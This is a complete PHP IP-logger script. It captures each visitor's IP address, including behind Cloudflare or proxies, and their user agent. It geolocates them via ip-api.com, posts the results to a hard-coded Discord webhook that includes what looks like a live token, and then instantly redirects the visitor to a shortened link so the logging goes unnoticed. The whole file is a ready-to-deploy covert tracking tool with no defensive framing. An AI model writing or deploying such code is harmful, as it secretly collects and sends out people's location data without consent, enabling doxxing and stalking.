<?php
// Discord Webhook URL
$webhook_url = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";

// Get visitor information
// Get the real IP address, even if behind a proxy
if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]); // Proxy IPs
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");

// Retrieve additional information using an IP API
$ip_info = json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=country,regionName,city,isp,query"), true);
$country = $ip_info['country'] ?? 'Unknown';
$region = $ip_info['regionName'] ?? 'Unknown';
$city = $ip_info['city'] ?? 'Unknown';
$isp = $ip_info['isp'] ?? 'Unknown';

// Format the message for Discord
$message = "**New Visitor Logged**\n\n".
    "**IP Address:** `$ip`\n".
    "**Country:** $country\n".
    "**Region:** $region\n".
    "**City:** $city\n".
    "**ISP:** $isp\n".
    "**User-Agent:** `$user_agent`\n".
    "**Time:** $time";

$json_data = json_encode([
    "content" => $message
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

// Send data to Discord
$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_exec($ch);
curl_close($ch);

// Redirect the user instantly
header("Location: https://is.gd/DWih0m"); // Change to your desired redirect URL
exit();
?>
